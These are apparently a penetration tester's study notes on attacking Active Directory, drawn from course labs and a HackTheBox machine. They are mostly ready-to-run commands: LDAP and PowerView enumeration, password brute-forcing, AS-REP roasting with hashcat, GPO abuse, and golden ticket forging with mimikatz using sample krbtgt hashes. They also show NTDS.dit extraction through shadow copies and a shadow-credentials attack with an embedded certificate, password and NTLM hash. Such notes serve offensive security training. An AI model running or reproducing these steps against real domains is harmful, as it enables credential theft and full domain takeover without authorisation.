#active-directory #ad-enum #windows
*While Active Directory itself is a service, it also acts as a management layer. AD contains critical information about the environment, storing information about users, groups, and computers, each referred to as _objects_. Permissions set on each object dictate the privileges that object has within the domain*
## Manual Enumeration 
#### Users and groups
Get information about users in the domain `net user /domain`
Get more detailed information about specific user `net user <username> /domain`
Get information about groups in the domain `net group /domain`
Get more detailed information about specific group `net group "group name" /domain`
#### LDAP Enumeration 
*LDAP path's prototype* `LDAP://HostName[:PortNumber][/DistinguishedName]`
Always focus on the Primary Domain Controller, look for the PdcRoleOwner property. 

Get information about current domain `[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()`
Obtain DN for domain `([adsi]'').distinguishedName`
##### BASIC POWERSHELL DOMAIN ENUM SCRIPT
```powershell
# Store the domain object in the $domainObj variable
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Store the PdcRoleOwner name to the $PDC variable
$PDC = $domainObj.PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName
$LDAP = "LDAP://$PDC/$DN"

# Print the variable
$domainObj

Write-Host "Primary DC: " $PDC
Write-Host "Full DN: " $LDAP

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"

$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }

    Write-Host "-------------------------------"
}

_______________________________________________________________-

// PUT INTO FUNCTION TO USE AS BELOW:

function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()

}

PS > Import-Module .\function.ps1
PS > LDAPSearch -LDAPQuery "(samAccountType=805306368)"
PS > LDAPSearch -LDAPQuery "(objectclass=group)"

foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
>> $group.properties | select {$_.cn}, {$_.member}
>> }

PS > $sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"
PS > $sales.properties.member

// Slow and steady brute force 
PS > $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
PS > $PDC = ($domainObj.PdcRoleOwner).Name
PS > $SearchString = "LDAP://"
PS > $SearchString += $PDC + "/"
PS > $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
PS > $SearchString += $DistinguishedName
PS > New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")

If the account brute force was success, the following object will be created
distinguishedName : {DC=corp,DC=com}
Path              : LDAP://DC1.corp.com/DC=corp,DC=com



```
## PowerView
https://powersploit.readthedocs.io/en/latest/Recon/
Import PowerView into PowerShell `Import-Module .\PowerView.ps1`
Domain enumeration `Get-NetDomain`
User enumeration `Get-NetUser` | `Get-NetUser | Select cn`
Check which user last logged on / passwd change 
`Get-NetUser | select cn,pwdlastset,lastlogin`
Group Enumeration `Get-NetGroup | select cn`
Get members from group `Get-NetGroup "Sales Department" | select member`
Get Computer Information `Get-NetComputer`
Get Detailed computer information `Get-NetComputer | select operatingsystem,dnshostname,operatingsystemversion`
Check if current user is local admin on domain computers: `Find-LocalAdminAccess`
Check GPO `Get-NetGPO` | `gpresult /r /scope:computer`
Check GPO Permission `Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName <user>`
Check for logged in users `Get-NetSession` | `Get-NetSession -ComputerName files04 -Verbose` -> Check if user is allowed to use SrvcSessionInfo `Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl`
Get ACL's of user `Get-ObjectACL -Identity stephanie`
Convert SID to name `Convert-SidToName <SID>`
Get a more clean version of ACL's where only ActiveDirectoryRights are with GenericAll
`Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights`
Check for AS-REP Roasting `Get-DomainUser -PreauthNotRequired`
Convert SID"s to name: `"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName`
Get Domain Shares `Find-DomainShare` -> `ls \\dc01.corp.com\sysvol\corp.com`
Group Policy Preference decrypt `gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"`

With GenerWrite or GenericAll permissions we can leverage Targeted AS-REP Roasting:


### Group Policy Abuse
Create new user with Write access on Policy`sharpGPOAbuse.exe --AddLocalAdmin --UserAccount charlotte --GPOName "DEFAULT DOMAIN POLICY"'
## PsLoggedOn
Fortunately there are other tools we can use, such as the [_PsLoggedOn_](https://learn.microsoft.com/en-us/sysinternals/downloads/psloggedon) application from the [_SysInternals Suite_](https://learn.microsoft.com/en-us/sysinternals/). The documentation states that PsLoggedOn will enumerate the registry keys under **HKEY_USERS** to retrieve the _security identifiers_ (SID) of logged-in users and convert the SIDs to usernames. PsLoggedOn will also use the _NetSessionEnum_ API to see who is logged on to the computer via resource shares. Remote Registry has to be turned on for PsLoggedOn to work
Scan an PC for logged on users: `.\PsLoggedon.exe \\files04`

## Service Principal Names
Applications use a set of predefined accounts, such as LocalSystem, LocalService and NetworkService. 
#### SETSPN 
Enumerate SPN `Get-NetUser -SPN | select samaccountname,serviceprincipalname`
Enumerate SPN of iis_service `setspn -L iis_service`

## Object Permissions
In short, an object in AD may have a set of permissions applied to it with multiple [_Access Control Entries_](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-entries) (ACE). These ACEs make up the [_Access Control List_](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists) (ACL). Each ACE defines whether access to the specific object is allowed or denied.
```
Permissions: 
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```
## Policies
Before brute forcing accounts, always make sure to check the lockout policy on accounts. 
View user account policies: `net accounts`
	Lockout threshold -> How many times a user can fail a login before being blocked
	Lockout Observation -> Minutes / Hours for the reset of the lockout threshold.
## AS-REP Roasting
Check with Rubeus if AS-REP roasting is possible. `.\Rubeus.exe asreproast /nowrap` -> `sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

## DCSync Attack
In production environments, domains typically rely on more than one domain controller to provide redundancy. The _Directory Replication Service_ (DRS) Remote Protocol[1](https://portal.offsec.com/courses/pen-200-44065/learning/attacking-active-directory-authentication-46102/performing-attacks-on-active-directory-authentication-46172/domain-controller-synchronization-46110#fn-local_id_233-1) uses _replication_[2](https://portal.offsec.com/courses/pen-200-44065/learning/attacking-active-directory-authentication-46102/performing-attacks-on-active-directory-authentication-46172/domain-controller-synchronization-46110#fn-local_id_233-2) to synchronize these redundant domain controllers. A domain controller may request an update for a specific object, like an account, using the _IDL_DRSGetNCChanges_[3](https://portal.offsec.com/courses/pen-200-44065/learning/attacking-active-directory-authentication-46102/performing-attacks-on-active-directory-authentication-46172/domain-controller-synchronization-46110#fn-local_id_233-3) API.

To launch such a replication, a user needs to have the _Replicating Directory Changes_, _Replicating Directory Changes All_, and _Replicating Directory Changes in Filtered Set_ rights. By default, members of the _Domain Admins_, _Enterprise Admins_, and _Administrators_ groups have these rights assigned.

## AD Persistence 
#### Golden Ticket 
Returning to the explanation of Kerberos authentication, we'll recall that when a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This secret key is the password hash of a domain user account called [_krbtgt_](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn745899\(v=ws.11\)#Sec_KRBTGT).

If we can get our hands on the _krbtgt_ password hash, we could create our own self-made custom TGTs, also known as [_golden tickets_](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don%27t-Get-It.pdf).

For example, we could create a TGT stating that a non-privileged user is a member of the Domain Admins group, and the domain controller will trust it because it is correctly encrypted.

To Forge the Golden Ticket we need the *krbtgt* NTLM hash and the domain SID. 
It does not require administrative privileges and can even be performed from an non domain joined workstation. Append 519 at the end of parent domain

hash:80f23a248d39b8cb93df3a4a2f4199a1
sub.poseidon.yzx KRBTGTG SID: S-1-5-21-4168247447-1722543658-2110108262-519
poseidon.yzx hash: 

mimkatz # privilege::debug
mimikatz # kerberos::golden /domain:sub.poseidon.yzx /user:Administrator /sid:S-1-5-21-1190331060-1711709193-932631991 /krbtgt:80f23a248d39b8cb93df3a4a2f4199a1 /sids:S-1-5-21-1190331060-1711709193-932631991-519 /ptt

Get-ADUser -Identity "Administrator" -Server dc01.poseidon.yzx
Get-ADUser -Identity "Administrator" -Server "DC01.poseidon.yzx" | Select-Object SID
Domain SID: enum4linux -P DCIP

`mimikatz # privilege::debug`
`mimikatz # lsadump::lsa /patch`

Forging: 
`mimikatz # kerberos::purge` *remote any old known kerberos tickets*
`mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt`
`mimikatz # misc::cmd`

Spawning new shell on the DC:
`PsExec.exe \\dc1 cmd.exe`

If we were to use the IP adress instead of the hostname we would be forced to use the NTLM authentication process. 

## Shadow Copies
A [_Shadow Copy_](https://en.wikipedia.org/wiki/Shadow_Copy), also known as _Volume Shadow Service_ (VSS) is a Microsoft backup technology that allows the creation of snapshots of files or entire volumes. To manage volume shadow copies, the Microsoft signed binary [_vshadow.exe_](https://learn.microsoft.com/en-us/windows/win32/vss/vshadow-tool-and-sample) is offered as part of the [Windows SDK](https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/).

As domain admins, we can abuse the vshadow utility to create a Shadow Copy that will allow us to extract the Active Directory Database [**NTDS.dit**](https://technet.microsoft.com/en-us/library/cc961761.aspx) database file. Once we've obtained a copy of the database, we need the SYSTEM hive, and then we can extract every user credential offline on our local Kali machine.

Start the backup copies `vshadow.exe -nw -p  C:`
Copy the Shadow copy device name with the full ntds.dit path 
`copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak`
Save the SYSTEM hive `reg.exe save hklm\system c:\system.bak`
Extract the passwords using secrets-dump `impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL`

```
echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
echo "create" | out-file ./diskshadow.txt -encoding ascii -append        
echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append

cd Z:\Windows\NTDS\
download ntds.dit file 


```

### AddKeyCredentialLink
With the AddKeyCredentialLink we can add credential link to an specified target. Use the Whisker.exe binary to add this credentiallinks and obtain KRBTGT hash: 
```
./whisker.exe add /target:sflowers

Then use Rubeus.exe to obtain the TGT:
/certificate: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 /password:"lXnFmdCwdsAJ7Rip" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show

Where the NTLM will be obtained: 
1FCDB1F6015DCB318CC77BB2BDA14DB5

```

